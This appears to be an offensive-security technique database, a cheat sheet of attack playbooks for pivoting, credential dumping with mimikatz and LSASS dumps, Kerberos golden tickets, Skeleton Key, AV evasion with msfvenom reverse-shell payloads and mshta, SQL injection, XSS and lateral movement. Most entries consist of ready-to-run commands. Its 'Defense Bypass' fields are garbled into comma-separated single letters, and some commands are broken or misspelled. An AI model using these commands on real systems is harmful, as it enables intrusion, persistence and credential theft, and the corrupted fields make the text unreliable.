#### double-pivot — Double/Triple Pivot
- Zone: lateral-movement | Category: lateral-movement | Difficulty: 4
- OS: linux, windows
- Tags: pivoting, multi-pivot, chisel, ligolo, chain
- Purpose: Access networks multiple hops away from attacker position
- When To Use: When target is behind multiple network segments requiring chain of pivots
- Prerequisites: Compromised Pivot1 with access to Pivot2 network, Tunneling tools on both pivots, Understanding of tunnel chaining
- Defense Bypass: E, a, c, h,  , p, i, v, o, t,  , h, o, p,  , a, d, d, s,  , l, a, t, e, n, c, y,  , a, n, d,  , p, o, t, e, n, t, i, a, l,  , d, e, t, e, c, t, i, o, n, ;,  , c, h, a, i, n,  , c, o, m, p, l, e, x, i, t, y,  , i, n, c, r, e, a, s, e, s,  , f, a, i, l, u, r, e,  , p, o, i, n, t, s
- Remediation: Network segmentation, disable SMBv1, enforce strong authentication
- MITRE ID: T1570
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Establish first pivot', 'command': 'chisel server -p 8000 --reverse && chisel client ATTACKER:8000 R:socks', 'note': 'Standard single pivot setup'}
  2. {'step': 2, 'description': 'Push tunneling tool to Pivot2', 'command': 'scp chisel user@pivot1:/tmp/', 'note': 'Transfer through first pivot'}
  3. {'step': 3, 'description': 'Chain second pivot', 'command': 'On Pivot1: ./chisel server -p 9000 --reverse && On Pivot2: ./chisel client PIVOT1:9000 R:socks', 'note': 'Pivot2 connects to Pivot1, not directly to attacker'}
  4. {'step': 4, 'description': 'Access deep target', 'command': 'proxychains4 nmap -sT -Pn DEEP_TARGET', 'note': 'Traffic: Attacker → Pivot1 → Pivot2 → Deep Target'}
- Related Tools: 10 — chisel, ligolo-ng, proxychains4, rpivot, scp, socat, ssh, sshuttle, tool:chisel, tool:ligolo

#### dns-enumeration — DNS Enumeration
- Zone: recon | Category: recon | Difficulty: 2
- OS: any
- Tags: recon, dns, enumeration, subdomains
- Purpose: Discover all domain hosts, services, and infrastructure
- When To Use: During initial reconnaissance phase
- Prerequisites: Target domain name, DNS server access
- Defense Bypass: D, N, S,  , e, n, u, m, e, r, a, t, i, o, n,  , g, e, n, e, r, a, t, e, s,  , l, o, g, s, ;,  , z, o, n, e,  , t, r, a, n, s, f, e, r, s,  , m, a, y,  , t, r, i, g, g, e, r,  , a, l, e, r, t, s,  , i, f,  , s, u, c, c, e, s, s, f, u, l
- Remediation: Implement network segmentation and disable unnecessary services
- MITRE ID: T1590
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Attempt zone transfer', 'command': 'dig axfr @DNS_SERVER target.com', 'note': 'Zone transfer rarely works but always try'}
  2. {'step': 2, 'description': 'Enumerate SRV records', 'command': 'nslookup -type=SRV _ldap._tcp.dc._msdcs.target.com', 'note': 'SRV records reveal DC hostnames without touching AD'}
  3. {'step': 3, 'description': 'Brute force subdomains', 'command': 'gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt', 'note': 'Find hidden subdomains'}
  4. {'step': 4, 'description': 'Reverse DNS lookup', 'command': 'for ip in $(seq 1 254); do nslookup 10.10.10.$ip; done', 'note': 'Map IP ranges to hostnames'}
- Related Tools: 15 — adidnsdump, amass, arp-scan, beroot, bloodhound, crackmapexec, curl, dig, docker, enum4linux, feroxbuster, foca, git, gobuster, grep

#### hashcat-attacks — Hash Cracking with Hashcat
- Zone: password-attacks | Category: password-attacks | Difficulty: 2
- OS: linux, windows
- Tags: password, hashcat, cracking, offline
- Purpose: Crack password hashes offline using GPU acceleration
- When To Use: After obtaining hashes via Kerberoasting, ASREPRoasting, NTLM relay, or NTLMv2 capture
- Prerequisites: Hash type identified, Hashcat installed with GPU drivers, Wordlist (rockyou.txt)
- Defense Bypass: H, a, s, h,  , c, r, a, c, k, i, n, g,  , i, s,  , o, f, f, l, i, n, e, ;,  , d, e, t, e, c, t, i, o, n,  , d, e, p, e, n, d, s,  , o, n,  , h, a, s, h,  , t, h, e, f, t, .,  , L, o, n, g, /, c, o, m, p, l, e, x,  , p, a, s, s, w, o, r, d, s,  , r, e, s, i, s, t,  , c, r, a, c, k, i, n, g, .
- Remediation: Enforce password complexity, implement MFA, lockout policies
- MITRE ID: T1003.002
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Identify hash type', 'command': 'name-that-hash -t HASH', 'note': 'Get hashcat mode number (e.g., 5600 for Net-NTLMv2)'}
  2. {'step': 2, 'description': 'Crack with dictionary attack', 'command': 'hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt', 'note': 'Straight dictionary attack; -m = mode, -a 0 = straight'}
  3. {'step': 3, 'description': 'Crack with rules', 'command': 'hashcat -m 5600 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule', 'note': 'Rules apply mutations (capitalization, append digits, etc.)'}
  4. {'step': 4, 'description': 'Brute force if dictionary fails', 'command': 'hashcat -m 5600 -a 3 hash.txt ?d?d?d?d', 'note': 'Mask attack: ?d = digit, ?l = lowercase, ?u = uppercase'}
- Related Tools: 14 — cewl, crunch, hashcat, hydra, john, medusa, name-that-hash, stegcracker, tool:cewl, tool:hashashcat, tool:hydra, tool:john, tool:maskprocessor, tool:medusa

#### credential-harvesting-advanced — Advanced Credential Harvesting
- Zone: post-exploitation | Category: post-exploitation | Difficulty: 3
- OS: windows, linux
- Tags: post-exploitation, credentials, mimikatz, lsass, harvesting
- Purpose: Extract all available credentials from compromised system
- When To Use: After obtaining initial access to any system
- Prerequisites: Initial access (user or admin), Appropriate tools for target OS
- Defense Bypass: C, r, e, d, e, n, t, i, a, l,  , d, u, m, p, i, n, g,  , g, e, n, e, r, a, t, e, s,  , S, e, c, u, r, i, t, y,  , E, v, e, n, t,  , L, o, g,  , e, v, e, n, t, s, ;,  , L, S, A, S, S,  , p, r, o, t, e, c, t, i, o, n,  , (, R, u, n, A, s, P, P, L, ),  , b, l, o, c, k, s,  , M, i, m, i, k, a, t, z
- Remediation: Network segmentation, process isolation, credential guard
- MITRE ID: T1056.004
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Dump Windows credentials with Mimikatz', 'command': 'mimikatz # privilege::debug && mimikatz # sekurlsa::logonpasswords', 'note': 'Requires admin/SeDebugPrivilege; extracts plaintext from memory'}
  2. {'step': 2, 'description': 'Dump LSASS memory', 'command': 'rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\lsass.dmp full', 'note': 'Dump LSASS without Mimikatz directly'}
  3. {'step': 3, 'description': 'Extract browser credentials', 'command': 'LaZagne.exe browsers', 'note': 'Recover saved passwords from Chrome, Firefox, Edge, etc.'}
  4. {'step': 4, 'description': 'Search filesystem for credentials', 'command': 'findstr /si password *.txt *.xml *.config *.ini 2>nul', 'note': 'Find plaintext passwords in config files and scripts'}
- Related Tools: 12 — covenant, crackmapexec, empire, impacket, lazagne, metasploit, mimikatz, nishang, screen, sliver, tool:empire, tool:powershell-empire

#### persistence-advanced — Advanced Persistence Techniques
- Zone: post-exploitation | Category: post-exploitation | Difficulty: 4
- OS: windows, linux
- Tags: post-exploitation, persistence, golden-ticket, silver-ticket, kerberos
- Purpose: Maintain access to compromised environment
- When To Use: After achieving domain compromise or high-value system access
- Prerequisites: Domain admin or equivalent access, krbtgt hash for Golden Tickets, DC access for DSRM
- Defense Bypass: G, o, l, d, e, n,  , T, i, c, k, e, t, s,  , a, r, e,  , s, t, e, a, l, t, h, y,  , b, u, t,  , k, r, b, t, g, t,  , h, a, s, h,  , e, x, t, r, a, c, t, i, o, n,  , i, s,  , n, o, i, s, y, ;,  , S, i, l, v, e, r,  , T, i, c, k, e, t, s,  , a, r, e,  , m, o, r, e,  , d, e, t, e, c, t, a, b, l, e,  , o, v, e, r,  , t, i, m, e
- Remediation: Network segmentation, process isolation, credential guard
- MITRE ID: T1053
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Create Golden Ticket', 'command': 'impacket-ticketer -nthash KRBGT_HASH -domain-sid SID -domain domain.local administrator', 'note': 'Full domain persistence; lasts 10 years by default'}
  2. {'step': 2, 'description': 'Create Silver Ticket', 'command': 'mimikatz # kerberos::golden /user:admin /domain:domain /sid:SID /target:server /service:cifs /rc4:SVC_HASH /ptt', 'note': 'Stealthier; targets specific service only'}
  3. {'step': 3, 'description': 'DSRM password abuse', 'command': 'reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save', 'note': 'Extract DSRM credentials for DC backdoor access'}
  4. {'step': 4, 'description': 'Scheduled task persistence', 'command': 'schtasks /create /tn Update /tr "C:\\payload.exe" /sc onlogon /ru SYSTEM', 'note': 'Windows scheduled task running as SYSTEM'}
- Related Tools: 15 — covenant, crackmapexec, empire, impacket, kerbrute, krbrelayx, lazagne, metasploit, mimikatz, nishang, rubeus, screen, sliver, tool:empire, tool:powershell-empire

#### av-evasion — Antivirus Evasion
- Zone: defense-evasion | Category: defense-evasion | Difficulty: 3
- OS: windows, linux
- Tags: defense-evasion, av, edr, obfuscation, shellter
- Purpose: Deploy payloads and tools without triggering AV/EDR alerts
- When To Use: When AV/EDR is present and blocking standard tools/payloads
- Prerequisites: Understanding of AV detection mechanisms, Obfuscation tools, Custom compilation capability
- Defense Bypass: A, V,  , e, v, a, s, i, o, n,  , i, s,  , a, n,  , o, n, g, o, i, n, g,  , a, r, m, s,  , r, a, c, e, ;,  , E, D, R,  , w, i, t, h,  , b, e, h, a, v, i, o, r, a, l,  , m, o, n, i, t, o, r, i, n, g,  , d, e, t, e, c, t, s,  , L, O, L, B, A, S,  , a, b, u, s, e
- Remediation: Monitor for suspicious process behavior and log modifications
- MITRE ID: T1027
- Command: #
- Steps (4):
  1. {'step': 1, 'description': 'Obfuscate payloads with msfvenom', 'command': 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f c -e x86/shikata_ga_nai -i 5', 'note': 'Shikata Ga Nai encoder with multiple iterations'}
  2. {'step': 2, 'description': 'Use Shellter for FUD payloads', 'command': 'wine Shellter.exe && Select target PE → Auto mode → Set LHOST/LPORT', 'note': 'Injects payload into legitimate Windows executable'}
  3. {'step': 3, 'description': 'Living-off-the-land binaries', 'command': "mshta.exe javascript:a=new ActiveXObject('WScript.Shell');a.Run('cmd /c payload');", 'note': 'Use trusted Windows binaries (mshta, msiexec, rundll32) to execute code'}
  4. {'step': 4, 'description': 'Remove VBA macros and obfuscate', 'command': 'Use obfuscator for PowerShell/C# code before compilation', 'note': 'Avoid detection signatures by obfuscating scripts'}
- Related Tools: 11 — metasploit, msfvenom, seccomp-tools, shellter, tool:amsi-bypass, tool:certify, tool:invoke-obfuscation, tool:lolbas, tool:runas, tool:solidcore, tool:srum

#### delegation-enum — Delegation Enumeration
- Zone: active-directory | Category: active-directory | Difficulty: 3
- OS: linux, windows
- Tags: kerberos, ad, enumeration
- Purpose: Enumerate Kerberos delegation configurations (unconstrained, constrained, RBCD) on domain accounts and services to find privilege escalation paths.
- When To Use: After gaining domain foothold. BloodHound or PowerView can find delegation edges. Essential for AD CS and lateral movement paths.
- Prerequisites: Active Domain access, Valid credentials
- Defense Bypass: 
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1558
- Command: #
- Steps (3):
  1. {'order': 1, 'description': 'Run BloodHound to enumerate AD delegation relationships', 'command': "bloodhound-python -u USER -p 'PASS' -d DOMAIN -ns DC_IP -c All", 'note': 'BloodHound will show unconstrained, constrained delegation, and RBCD paths'}
  2. {'order': 2, 'description': 'Query AD for computers with TrustedForDelegation enabled', 'command': 'Get-DomainComputer -Filter {TrustedForDelegation -eq $true} | select name', 'note': 'These hosts will forward TGTs of any user who authenticates to them'}
  3. {'order': 3, 'description': 'Check for resource-based constrained delegation (RBCD) write permissions', 'command': 'Get-DomainComputer TARGET_HOST | select-object -ExpandProperty msDS-AllowedToActOnBehalfOfOtherIdentity', 'note': 'If writeable, you can add a malicious ACE to grant delegated access'}
- Related Tools: 15 — adidnsdump, beroot, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, find, gpp-decrypt, impacket, impacket-secretsdump, kerbrute

#### gpp-abuse — GPP Password Abuse
- Zone: active-directory | Category: active-directory | Difficulty: 2
- OS: linux
- Tags: gpp, ad, credentials
- Purpose: Extract and decrypt GPP (Group Policy Preferences) stored passwords from SYSVOL shares to obtain service account credentials.
- When To Use: Always check for cpassword in SYSVOL XML files. Use gpp-decrypt or Get-GPPPassword for decryption.
- Prerequisites: SMB/IPC$ share access, Read access to SYSVOL
- Defense Bypass: 
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1552
- Command: #
- Steps (3):
  1. {'order': 1, 'description': 'Search SYSVOL for GPP XML files containing cpassword', 'command': 'findstr /S /I cpassword \\domain\\sysvol\\domain\\policies\\*.xml', 'note': 'Look in Groups.xml, Services.xml, ScheduledTasks.xml, Printers.xml, Drives.xml'}
  2. {'order': 2, 'description': 'Extract the cpassword value from the XML', 'command': 'grep -oh \'cpassword="[^"]*"\' *.xml | cut -d\'"\' -f2', 'note': 'The cpassword is AES-encrypted but the key is publicly known'}
  3. {'order': 3, 'description': 'Decrypt the GPP password', 'command': 'gpp-decr CPASSWORD_VALUE', 'note': 'AES key published by Microsoft makes all GPP passwords effectively plaintext'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, coercer, crackmapexec, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump, kerbrute, krbrelayx, lazagne

#### skeleton-key — Skeleton Key malware
- Zone: active-directory | Category: active-directory | Difficulty: 5
- OS: windows, linux
- Tags: mimikatz, ad, persistence
- Purpose: Inject the Skeleton Key malware into a Domain Controller process to bypass authentication for any domain user, allowing password-less access.
- When To Use: After obtaining DA privileges on a domain controller with Mimikatz or similar. Requires DA-level access to inject.
- Prerequisites: Domain Admin access, Mimikatz, DC process injection capability
- Defense Bypass: 
- Remediation: Enforce LDAP signing, disable legacy authentication, implement tiering
- MITRE ID: T1556
- Command: #
- Steps (3):
  1. {'order': 1, 'description': 'Confirm Domain Admin access on a Domain Controller', 'command': 'whoami /groups | findstr "Domain Admins"', 'note': 'Skeleton Key requires DA privileges to inject into LSASS'}
  2. {'order': 2, 'description': 'Enable debug privilege in Mimikatz', 'command': 'mimikatz # privilege::debug', 'note': 'Debug privilege required to interact with LSASS process'}
  3. {'order': 3, 'description': 'Inject Skeleton Key malware into the LSASS process', 'command': 'mimikatz # misc::skeleton', 'note': 'Patches Kerberos to accept any password for any domain user - persistent backdoor'}
- Related Tools: 15 — adidnsdump, bloodhound, bloodyad, certify, certipy, cewl, coercer, crackmapexec, crunch, empire, enum4linux, evil-winrm, gpp-decrypt, impacket, impacket-secretsdump

#### tech:sqli-auth-bypass — SQL Injection - Authentication Bypass
- Zone: web | Category: web | Difficulty: 
- OS: linux, macos, windows
- Tags: sqli, auth-bypass, web
- Purpose: Bypass login forms using SQL injection in credentials
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: sqlmap -u 'http://target/login.php' --data='user=admin&pass=pass' --technique=B --batch
- Steps (5):
  1. 1. Identify login endpoint (e.g., /login.php)
  2. 2. Capture POST request with credentials
  3. 3. Test for SQLi: user=admin'-- or'1'='1&pass=anything
  4. 4. Run sqlmap: sqlmap -u URL --data=DATA --technique=B
  5. 5. Use dumped credentials to log in
- Related Tools: 15 — aquatone, burp-suite, cewl, cmsmap, commix, corsy, eyewitness, feroxbuster, ffuf, git-dumper, gobuster, httpx, hydra, impacket, jwt_tool

#### tech:xss-reflected — Reflected XSS
- Zone: web | Category: web | Difficulty: 
- OS: linux, macos, windows
- Tags: xss, injection, web
- Purpose: Inject malicious JS via URL parameters that execute in browser
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: dalfox scan --silence --deep-detect
- Steps (5):
  1. 1. Find URL parameters (e.g., ?search=)
  2. 2. Test with payload: '><script>alert(1)</script>
  3. 3. If reflected, enumerate XSS filters
  4. 4. Use dalfox or XSStrike for automation
  5. 5. Craft session-stealing payload
- Related Tools: 15 — aquatone, burp-suite, cewl, cmsmap, commix, corsy, eyewitness, feroxbuster, ffuf, git-dumper, gobuster, httpx, jwt_tool, lfisuite, liffy

#### tech:csrf — Cross-Site Request Forgery
- Zone: web | Category: web | Difficulty: 
- OS: linux, macos, windows
- Tags: csrf, web, auth
- Purpose: Trick authenticated user into performing unwanted actions
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: # Craft CSRF HTML page and host it
- Steps (5):
  1. 1. Identify a state-changing endpoint (POST/PUT/DELETE)
  2. 2. Check if CSRF token is present
  3. 3. If no token or predictable, create CSRF HTML page
  4. 4. Send link to victim; action executes on their session
  5. 5. Chain with XSS for token theft
- Related Tools: 15 — aquatone, burp-suite, cewl, cmsmap, commix, corsy, eyewitness, feroxbuster, ffuf, git-dumper, gobuster, httpx, jwt_tool, lfisuite, liffy

#### tech:ssrf — Server-Side Request Forgery
- Zone: web | Category: web | Difficulty: 
- OS: linux, macos, windows
- Tags: ssrf, internal, cloud
- Purpose: Force server to make requests to internal or external systems
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: # Test SSRF via URL parameter
- Steps (5):
  1. 1. Find parameters that fetch URLs (e.g., img, url, file)
  2. 2. Test with http://127.0.0.1, file:///etc/passwd
  3. 3. Use DNS rebinding for internal-only targets
  4. 4. Enumerate cloud metadata endpoints (169.254.169.254)
  5. 5. Pivot to internal services
- Related Tools: 15 — burp-suite, cmsmap, commix, corsy, feroxbuster, ffuf, git-dumper, gobuster, jwt_tool, lfisuite, liffy, nikto, nuclei, paramspider, sqlmap

#### tech:idor — Insecure Direct Object Reference
- Zone: web | Category: web | Difficulty: 
- OS: linux, macos, windows
- Tags: idor, access-control, web
- Purpose: Access unauthorized data by manipulating object references
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: # Increment/change object IDs in requests
- Steps (5):
  1. 1. Map object ID parameters (e.g., /user?id=123)
  2. 2. Change ID values to enumerate all objects
  3. 3. Test parameter pollution and array indices
  4. 4. Identify unauthorized access
  5. 5. Automate with parameth or custom scripts
- Related Tools: 15 — aquatone, burp-suite, cewl, cmsmap, commix, corsy, eyewitness, feroxbuster, ffuf, git-dumper, gobuster, httpx, jwt_tool, lfisuite, liffy

#### tech:broken-access-control — Broken Access Control (OWASP)
- Zone: web | Category: web | Difficulty: 
- OS: linux, macos, windows
- Tags: access-control, web, auth
- Purpose: Exploit improper restrictions on user actions
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: # Test role-based access by changing user context
- Steps (5):
  1. 1. Identify admin/user role differences in the app
  2. 2. Test privilege escalation via role manipulation
  3. 3. Use forceful browsing to access admin endpoints
  4. 4. Fuzz for backup APIs and hidden parameters
  5. 5. Chain with IDOR
- Related Tools: 15 — aquatone, burp-suite, cewl, cmsmap, commix, corsy, eyewitness, feroxbuster, ffuf, git-dumper, gobuster, httpx, jwt_tool, lfisuite, liffy

#### tech:password-spraying — Password Spraying
- Zone: recon | Category: recon | Difficulty: 
- OS: linux, macos, windows
- Tags: password, bruteforce, spraying
- Purpose: Use common passwords against many accounts to avoid lockouts
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: hydra -L users.txt -P passwords.txt target.com http-post-form '/login:username=^USER^&password=^PASS^:invalid'
- Steps (5):
  1. 1. Gather list of valid usernames (email harvest, LinkedIn)
  2. 2. Compile a list of 5-10 common passwords
  3. 3. Use hydra or spray tool to test each password against all users
  4. 4. Monitor for rate limiting/lockouts
  5. 5. Once found, switch to targeted attacks
- Related Tools: 15 — amass, cewl, crunch, curl, dig, docker, foca, git, grep, httpx, ivre, masscan, medusa, metagoofil, mimikatz

#### tech:kerberoasting — Kerberoasting
- Zone: recon | Category: recon | Difficulty: 
- OS: linux
- Tags: kerberoasting, kerberos, windows
- Purpose: Extract service account hashes from Kerberos tickets
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: GetUserSPNs.py domain/user -request -dc-ip <dc> -tf kirbi
- Steps (5):
  1. 1. Enumerate domain users and SPNs (BloodHound, ldapdomaindump)
  2. 2. Request TGS tickets: GetUserSPNs.py domain/user -request
  3. 3. Crack with hashcat: hashcat -m 13100 hash.txt wordlist
  4. 4. Use cracked password for lateral movement
  5. 5. Dump additional secrets with secretsdump
- Related Tools: 15 — amass, beroot, curl, dig, docker, foca, git, godpotato, grep, httpx, ivre, juicy-potato, kerbrute, krbrelayx, lazagne

#### tech:ntlm-cracking — NTLM Hash Cracking
- Zone: recon | Category: recon | Difficulty: 
- OS: linux, macos
- Tags: hash, ntlm, cracking
- Purpose: Crack captured NTLM hashes using dictionary or brute force
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: hashcat -m 1000 hash.txt wordlist.txt
- Steps (5):
  1. 1. Capture NTLM hash via Responder or secretsdump
  2. 2. Check hash length (32 hex chars for NTLM)
  3. 3. Run hashcat: hashcat -m 1000 hash.txt rockyou.txt
  4. 4. Try online lookup (crackstation.net)
  5. 5. If no password, use pass-the-hash
- Related Tools: 15 — amass, curl, dig, docker, foca, git, grep, hashcat, httpx, ivre, john, masscan, metagoofil, naabu, name-that-hash

#### tech:llmnr-nbtspoofing — LLMNR/NBT-NS Poisoning
- Zone: recon | Category: recon | Difficulty: 
- OS: linux
- Tags: llmnr, nbt-ns, relaying
- Purpose: Poison LLMNR/NBT-NS name resolution to capture hashes
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: sudo responder -I eth0 -wrfPvE
- Steps (5):
  1. 1. Identify targets on same subnet listening for names
  2. 2. Run Responder: responder -I eth0 -wrf
  3. 3. Wait for authentication attempts (LLMNR/NBT-NS)
  4. 4. Capture NTLMv2 hashes in /usr/share/responder
  5. 5. Crack offline with hashcat
- Related Tools: 15 — amass, curl, dig, docker, foca, git, grep, httpx, ivre, masscan, metagoofil, naabu, name-that-hash, nmap, nslookup

#### tech:ps-remoting — PowerShell Remoting (WinRM)
- Zone: recon | Category: recon | Difficulty: 
- OS: windows, linux
- Tags: ps-remoting, winrm, windows
- Purpose: Execute commands on remote Windows hosts via WinRM
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: Enter-PSSession -ComputerName target -Credential (Get-Credential)
- Steps (5):
  1. 1. Identify hosts with WinRM enabled (port 5985/5986)
  2. 2. Check if domain user has RDP/Remote Management rights
  3. 3. Use Enter-PSSession or Invoke-Command
  4. 4. Run credential dumping: Invoke-Mimikatz
  5. 5. Move to next target with new credentials
- Related Tools: 15 — amass, beroot, crackmapexec, curl, dig, docker, evil-winrm, foca, git, godpotato, grep, httpx, ivre, juicy-potato, lazagne

#### tech:ssh-lateral — SSH Lateral Movement
- Zone: recon | Category: recon | Difficulty: 
- OS: linux, macos
- Tags: ssh, lateral, linux
- Purpose: Use stolen SSH credentials or keys to move between hosts
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: ssh user@host -i key.pem
- Steps (5):
  1. 1. Capture SSH keys from current host (history, configs)
  2. 2. Check for passwordless SSH to internal hosts
  3. 3. Add key to ssh-agent: ssh-add key
  4. 4. Connect to internal hosts
  5. 5. Repeat enumeration on new host
- Related Tools: 15 — amass, beroot, curl, dig, docker, foca, git, grep, httpx, impacket, ivre, lazagne, linenum, linpeas, linux-exploit-suggester

#### tech:pass-the-hash — Pass-the-Hash
- Zone: recon | Category: recon | Difficulty: 
- OS: linux, windows
- Tags: pth, hash, windows
- Purpose: Authenticate using NTLM hash without knowing the password
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: evil-winrm -i target -u user -H 'aad3b4157832e69331d382b2e45e0d4d:840e6e2c2e2e2e2e2e2e2e2e2e2e2e2e'
- Steps (5):
  1. 1. Obtain NTLM hash (secretsdump, mimikatz, capture)
  2. 2. Use crackmapexec or evil-winrm: -H <hash>
  3. 3. Check admin access on target subnets
  4. 4. Execute commands via WMI, PsExec, or WinRM
  5. 5. Dump more credentials or move laterally
- Related Tools: 15 — amass, beroot, cewl, crunch, curl, dig, docker, foca, git, godpotato, grep, httpx, ivre, juicy-potato, lazagne

#### tech:psexec — PsExec Lateral Movement
- Zone: recon | Category: recon | Difficulty: 
- OS: linux, windows
- Tags: psexec, smb, windows
- Purpose: Execute commands remotely via Windows SMB service
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: psexec.py domain/user:password@target
- Steps (5):
  1. 1. Confirm SMB is open (port 445)
  2. 2. Verify credentials have admin rights on target
  3. 3. Use psexec.py or Metasploit psexec module
  4. 4. Execute commands on remote host
  5. 5. Dump credentials with mimikatz or secretsdump
- Related Tools: 15 — amass, beroot, crackmapexec, curl, dig, docker, enum4linux, foca, git, godpotato, grep, httpx, impacket, ivre, juicy-potato

#### tech:wmi-lateral — WMI Lateral Movement
- Zone: recon | Category: recon | Difficulty: 
- OS: windows
- Tags: wmi, windows, lateral
- Purpose: Use Windows Management Instrumentation for remote execution
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: wmic /node:target /user:domain\\user process call create 'cmd.exe'
- Steps (5):
  1. 1. Verify WMI service running on target port 135
  2. 2. Authenticate with valid credentials
  3. 3. Execute via wmic or PowerShell Invoke-WmiMethod
  4. 4. Run Mimikatz to dump credentials
  5. 5. Pivot to additional hosts
- Related Tools: 15 — amass, beroot, curl, dig, docker, evil-winrm, foca, git, godpotato, grep, httpx, ivre, juicy-potato, lazagne, masscan

#### tech:sudo-lpe — Sudo/SUID Privilege Escalation
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 
- OS: linux
- Tags: sudo, suid, linux, priv-esc
- Purpose: Exploit misconfigured sudo rules or SUID binaries for root
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: sudo -l && find / -perm -4000 2>/dev/null
- Steps (5):
  1. 1. Run sudo -l to list allowed commands
  2. 2. Check for NOPASSWD entries and command wildcards
  3. 3. Find SUID binaries: find / -perm -4000
  4. 4. Search GTFOBins for exploitation techniques
  5. 5. Use perl -c, find -delete, or awk to escalate
- Related Tools: 15 — accesschk, beroot, find, getcap, godpotato, icacls, jucypotato, juicy-potato, linenum, linpeas, linux-exploit-suggester, lse, powerup, printspoofer, privesccheck

#### tech:kernel-exploit — Kernel Exploit for Privilege Escalation
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 
- OS: linux
- Tags: kernel, linux, priv-esc
- Purpose: Exploit kernel vulnerabilities to escalate privileges
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: uname -r && searchsploit linux kernel <version>
- Steps (5):
  1. 1. Get kernel version: uname -a
  2. 2. Identify architecture and distribution
  3. 3. Search for local exploits (exploit-db, google)
  4. 4. Upload and compile exploit on target
  5. 5. Run exploit to get root shell
- Related Tools: 15 — accesschk, beroot, find, getcap, godpotato, icacls, jucypotato, juicy-potato, linenum, linpeas, linux-exploit-suggester, lse, powerup, printspoofer, privesccheck

#### tech:linux-docker-escape — Docker Escape Privilege Escalation
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 
- OS: linux
- Tags: docker, container, linux
- Purpose: Escape Docker containers to gain host access
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: docker run --rm -v /:/mnt alpine chroot /mnt
- Steps (5):
  1. 1. Check if running in Docker: cat /proc/1/cgroup
  2. 2. Look for mounted sockets: ls -la /var/run/docker.sock
  3. 3. If docker.sock mounted, run privileged container
  4. 4. Mount host filesystem and chroot
  5. 5. Or use CVE exploits for specific Docker versions
- Related Tools: 15 — accesschk, beroot, docker, find, getcap, godpotato, icacls, jucypotato, juicy-potato, linenum, linpeas, linux-exploit-suggester, lse, powerup, printspoofer

#### tech:unquoted-service — Unquoted Service Path
- Zone: privilege-escalation | Category: privilege-escalation | Difficulty: 
- OS: windows
- Tags: windows, service, priv-esc
- Purpose: Exploit unquoted service paths with spaces for privilege escalation
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: # Search for unquoted paths in services
- Steps (5):
  1. 1. Enumerate services: sc query
  2. 2. Find unquoted paths with spaces
  3. 3. Place binary in writable path directory
  4. 4. Restart service or wait for reboot
  5. 5. Gain SYSTEM privileges
- Related Tools: 15 — accesschk, beroot, find, gdb, getcap, godpotato, icacls, jucypotato, juicy-potato, lazagne, linenum, linpeas, linux-exploit-suggester, lse, powershell

#### tech:jenkins-script — Jenkins Script Console Exploitation
- Zone: exploitation-frameworks | Category: exploitation-frameworks | Difficulty: 
- OS: linux
- Tags: jenkins, groovy, rce
- Purpose: Exploit Jenkins script console for RCE
- When To Use: 
- Prerequisites: 
- Defense Bypass: 
- Remediation: 
- MITRE ID: 
- Command: # Use Jenkins script console to execute Groovy
- Steps (5):
  1. 1. Find Jenkins with /script console accessible
  2. 2. Authenticate or exploit via stored credentials
  3. 3. Write Groovy script to execute system commands
  4. 4. Deploy reverse shell or persistence
  5. 5. Move to other Jenkins nodes
- Related Tools: 15 — burp-suite, cmsmap, commix, corsy, feroxbuster, ffuf, git-dumper, gobuster, gpp-decrypt, jwt_tool, lfisuite, liffy, linux-exploit-suggester, metasploit, msfconsole

